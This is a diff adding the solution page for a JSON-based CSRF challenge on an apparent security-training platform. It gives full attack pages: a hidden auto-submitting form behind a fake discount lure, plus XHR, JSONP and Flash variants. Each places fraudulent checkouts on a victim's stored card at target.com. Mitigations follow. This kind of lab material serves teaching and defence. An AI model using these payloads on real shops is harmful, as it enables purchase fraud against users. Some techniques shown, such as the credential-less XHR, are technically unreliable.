@@ -1,0 +1,302 @@
+{% extends 'base.html' %}
+
+{% block title %}CSRF Level 3 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header">
+                <h2 class="text-center">
+                    <i class="bi bi-lightbulb-fill me-2"></i>
+                    Level 3 Solution: JSON-based CSRF - ShopSmart E-commerce Attack
+                </h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>This challenge demonstrates CSRF attacks against ShopSmart's JSON-based checkout API. Many developers incorrectly assume that JSON content-type alone prevents CSRF attacks, but browsers can be tricked into sending JSON payloads through various techniques.</p>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Required</h4>
+                    </div>
+                    <div class="card-body">
+                        <p><strong>Primary Tools:</strong> Browser Developer Tools, Burp Suite, JavaScript console</p>
+                        <p><strong>Skills:</strong> JSON payload crafting, XMLHttpRequest manipulation, Form encoding bypass</p>
+                        <p><strong>Advanced Techniques:</strong> JSONP exploitation, Flash-based attacks, Form content-type manipulation</p>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-warning text-dark">
+                        <h4 class="mb-0"><i class="bi bi-list-ol me-2"></i>Step-by-Step Solution</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li><strong>Analyze JSON API:</strong> Identify the checkout endpoint that accepts JSON requests</li>
+                            <li><strong>Examine Request Structure:</strong> Understand the JSON payload format for checkout operations</li>
+                            <li><strong>Test Content-Type Flexibility:</strong> Check if the API accepts form-encoded data or other content types</li>
+                            <li><strong>Craft CSRF Payload:</strong> Create a malicious form that can submit JSON-like data</li>
+                            <li><strong>Bypass Preflight Checks:</strong> Use simple requests to avoid CORS preflight validation</li>
+                            <li><strong>Execute Attack:</strong> Trigger unauthorized checkout operations through CSRF</li>
+                        </ol>
+                        <div class="alert alert-warning mt-3">
+                            <strong>Key Insight:</strong> JSON content-type alone is insufficient CSRF protection. APIs must validate request origins and implement proper CSRF tokens.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>JSON CSRF Attack Payloads</h4>
+                    </div>
+                    <div class="card-body">
+                        <h5>1. Form-Encoded JSON Attack</h5>
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Form-based JSON CSRF Attack --&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;ShopSmart - Special Discount!&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;🎉 Flash Sale: 90% Off Everything!&lt;/h2&gt;
+    &lt;p&gt;Limited time offer - Click to claim your discount now!&lt;/p&gt;
+    
+    &lt;!-- Malicious form targeting JSON API --&gt;
+    &lt;form id="csrf-attack" action="http://target.com/csrf/level3" method="post" 
+          enctype="text/plain" style="display:none;"&gt;
+        &lt;input name='{"items":[{"id":"premium_item","quantity":10,"price":0.01}],"shipping_address":"Attacker Address","payment_method":"victim_card","total":0.10}' value=''&gt;
+    &lt;/form&gt;
+    
+    &lt;!-- Decoy button --&gt;
+    &lt;button onclick="claimDiscount()" style="background:red;color:white;padding:20px;font-size:18px;"&gt;
+        🛒 CLAIM 90% DISCOUNT NOW!
+    &lt;/button&gt;
+    
+    &lt;script&gt;
+    function claimDiscount() {
+        document.body.innerHTML = '&lt;h3&gt;Processing your discount...&lt;/h3&gt;';
+        document.getElementById('csrf-attack').submit();
+    }
+    
+    // Auto-execute after 3 seconds
+    setTimeout(function() {
+        document.getElementById('csrf-attack').submit();
+    }, 3000);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+                        <h5 class="mt-4">2. XMLHttpRequest JSON Attack</h5>
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Advanced XMLHttpRequest CSRF --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h2&gt;ShopSmart Checkout Processor&lt;/h2&gt;
+    &lt;p&gt;Processing your previous order...&lt;/p&gt;
+    
+    &lt;script&gt;
+    function executeJSONCSRF() {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'http://target.com/csrf/level3', true);
+        
+        // Try to bypass preflight with simple content-type
+        xhr.setRequestHeader('Content-Type', 'text/plain');
+        
+        var maliciousPayload = JSON.stringify({
+            "items": [
+                {
+                    "id": "expensive_item_123",
+                    "name": "Premium Product",
+                    "quantity": 5,
+                    "price": 0.01
+                },
+                {
+                    "id": "gift_card_1000",
+                    "name": "$1000 Gift Card",
+                    "quantity": 3,
+                    "price": 0.01
+                }
+            ],
+            "shipping_address": {
+                "name": "Attacker Name",
+                "address": "123 Malicious St",
+                "city": "Hack City",
+                "zip": "12345"
+            },
+            "payment_method": {
+                "type": "stored_card",
+                "card_id": "victim_primary_card"
+            },
+            "promo_code": "FREE_EVERYTHING",
+            "total": 0.06
+        });
+        
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                console.log('CSRF attack executed:', xhr.responseText);
+            }
+        };
+        
+        xhr.send(maliciousPayload);
+    }
+    
+    // Execute attack
+    window.onload = function() {
+        setTimeout(executeJSONCSRF, 1000);
+    };
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+                        <h5 class="mt-4">3. JSONP Callback Attack</h5>
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- JSONP-based CSRF exploitation --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h2&gt;ShopSmart Product Catalog&lt;/h2&gt;
+    
+    &lt;script&gt;
+    // Define callback function
+    function processCheckout(data) {
+        console.log('Checkout data processed:', data);
+        // Attack executed through JSONP callback
+    }
+    
+    // Malicious JSONP request
+    var script = document.createElement('script');
+    script.src = 'http://target.com/csrf/level3?callback=processCheckout&' +
+                'items=' + encodeURIComponent('[{"id":"premium","quantity":10,"price":0.01}]') +
+                '&shipping_address=' + encodeURIComponent('Attacker Address') +
+                '&payment_method=victim_card&total=0.10';
+    document.head.appendChild(script);
+    &lt;/script&gt;
+    
+    &lt;!-- Alternative: Dynamic script injection --&gt;
+    &lt;script src="http://target.com/csrf/level3?callback=processCheckout&order_id=CSRF_ATTACK"&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-gear-fill me-2"></i>Advanced JSON CSRF Techniques</h4>
+                    </div>
+                    <div class="card-body">
+                        <h5>1. Content-Type Manipulation</h5>
+                        <pre class="bg-dark text-light p-2 rounded"><code>// Try different content types that bypass preflight
+var contentTypes = [
+    'text/plain',
+    'application/x-www-form-urlencoded',
+    'multipart/form-data'
+];
+
+contentTypes.forEach(function(type) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '/csrf/level3');
+    xhr.setRequestHeader('Content-Type', type);
+    xhr.send(jsonPayload);
+});</code></pre>
+
+                        <h5 class="mt-3">2. Flash-based JSON Attack</h5>
+                        <pre class="bg-dark text-light p-2 rounded"><code>&lt;!-- Flash-based CSRF (Legacy systems) --&gt;
+&lt;object width="1" height="1"&gt;
+    &lt;param name="movie" value="csrf-attack.swf"&gt;
+    &lt;param name="allowScriptAccess" value="always"&gt;
+    &lt;param name="flashvars" value="target=http://target.com/csrf/level3&payload={malicious_json}"&gt;
+&lt;/object&gt;</code></pre>
+
+                        <h5 class="mt-3">3. Form Multipart JSON</h5>
+                        <pre class="bg-dark text-light p-2 rounded"><code>&lt;form action="http://target.com/csrf/level3" method="post" enctype="multipart/form-data"&gt;
+    &lt;input type="hidden" name="json" value='{"items":[{"id":"premium","price":0.01}]}'&gt;
+    &lt;input type="submit" value="Submit"&gt;
+&lt;/form&gt;</code></pre>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-shield-exclamation me-2"></i>Security Impact</h4>
+                    </div>
+                    <div class="card-body">
+                        <p>JSON-based CSRF vulnerabilities in ShopSmart's checkout system allow attackers to:</p>
+                        <ul>
+                            <li><strong>Fraudulent Purchases:</strong> Execute unauthorized purchases using victim's stored payment methods</li>
+                            <li><strong>Inventory Manipulation:</strong> Purchase high-value items at extremely low prices</li>
+                            <li><strong>Gift Card Theft:</strong> Order gift cards to attacker-controlled addresses</li>
+                            <li><strong>Account Takeover:</strong> Modify shipping addresses and payment information</li>
+                            <li><strong>Financial Loss:</strong> Cause significant revenue loss through fraudulent discount abuse</li>
+                        </ul>
+                        <div class="alert alert-danger mt-3">
+                            <strong>E-commerce Impact:</strong> A successful JSON CSRF attack can result in massive financial losses, chargebacks, and loss of customer trust in the platform's security.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h4>
+                    </div>
+                    <div class="card-body">
+                        <h5>Primary Defenses:</h5>
+                        <ul>
+                            <li><strong>CSRF Tokens:</strong> Implement anti-CSRF tokens in all JSON API requests</li>
+                            <li><strong>Origin Validation:</strong> Strictly validate Origin and Referer headers</li>
+                            <li><strong>Custom Headers:</strong> Require custom headers like X-Requested-With for API calls</li>
+                            <li><strong>SameSite Cookies:</strong> Use SameSite=Strict for authentication cookies</li>
+                        </ul>
+                        
+                        <h5>JSON-Specific Protections:</h5>
+                        <ul>
+                            <li><strong>Content-Type Validation:</strong> Strictly enforce application/json content-type</li>
+                            <li><strong>JSON Parser Validation:</strong> Reject malformed or non-JSON payloads</li>
+                            <li><strong>CORS Configuration:</strong> Implement proper CORS policies for JSON APIs</li>
+                            <li><strong>Preflight Enforcement:</strong> Require preflight requests for all JSON operations</li>
+                        </ul>
+
+                        <h5>E-commerce Specific:</h5>
+                        <ul>
+                            <li><strong>Transaction Verification:</strong> Implement email/SMS confirmation for purchases</li>
+                            <li><strong>Rate Limiting:</strong> Limit checkout operations per user/IP</li>
+                            <li><strong>Price Validation:</strong> Server-side price verification for all items</li>
+                            <li><strong>Fraud Detection:</strong> Monitor for unusual purchase patterns</li>
+                        </ul>
+
+                        <div class="alert alert-success mt-3">
+                            <strong>Secure JSON API Implementation:</strong>
+                            <pre class="mt-2"><code>// Secure checkout endpoint
+app.post('/api/checkout', [
+    validateCSRFToken,
+    validateOrigin,
+    requireCustomHeader,
+    validateJSONContentType
+], (req, res) =&gt; {
+    // Secure checkout processing
+    if (!isValidJSON(req.body)) {
+        return res.status(400).json({error: 'Invalid request'});
+    }
+    // Process checkout...
+});</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/csrf/level2" class="btn btn-secondary me-2">
+                        <i class="bi bi-arrow-left me-1"></i>Previous Challenge
+                    </a>
+                    <a href="/csrf/level3" class="btn btn-primary me-2">
+                        <i class="bi bi-arrow-left me-1"></i>Back to Challenge
+                    </a>
+                    <a href="/csrf/level4" class="btn btn-success">
+                        <i class="bi bi-arrow-right me-1"></i>Next Challenge
+                    </a>
+                    <a href="/challenges" class="btn btn-info ms-2">
+                        <i class="bi bi-list me-1"></i>All Challenges
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
